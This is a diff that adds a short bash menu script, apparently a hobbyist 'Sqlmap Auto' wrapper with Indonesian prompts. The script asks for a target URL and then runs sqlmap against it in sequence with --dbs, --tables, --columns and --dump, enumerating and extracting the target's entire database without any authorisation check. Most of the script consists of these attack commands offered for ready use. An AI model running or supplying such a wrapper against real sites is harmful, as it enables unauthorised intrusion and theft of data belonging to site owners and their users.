@@ -1,0 +1,55 @@
+#!/bin/bash
+
+clear
+echo "   
+        \033[31;1m..::|[ Sqlmap Auto ]|::.. \033[0m
+"
+echo -n "\n[+]Masukan Taget: "
+read TRGT
+echo "\ntarget: $TRGT"
+echo "[+]Memulai"
+echo "Scan \033[31;1m "
+
+echo -n "\n[#]Auto[#]: (y),(n)"
+read yagak
+echo "\ntarget: $yagak"
+
+echo "wait"
+
+if [ $yagak = y ] || [ $yagak = Y ]
+then
+cd ../x
+python2 sqlmap.py -u $TRGT --dbs
+python2 sqlmap.py -u $TRGT --tables
+python2 sqlmap.py -u $TRGT --columns
+python2 sqlmap.py -u $TRGT --dump
+fi
+
+if [ $yagak = n ] || [ $yagak = N ]
+then
+sh sqlmap1
+fi
+
+echo "[+]Code By Azzar Nuji"
+
+
+echo -n "\n[+]B[+] Kembali..!!!"
+echo -n "\n[+]K[+] Keluar...!!!"
+
+read BK
+echo "\ntarget: $BK"
+
+if [ $BK = b ] || [ $BK = B ]
+then
+clear
+sh start
+fi
+
+if [ $BK = k ] || [ $BK = K ]
+then
+clear
+sh exit
+fi
+
+
+
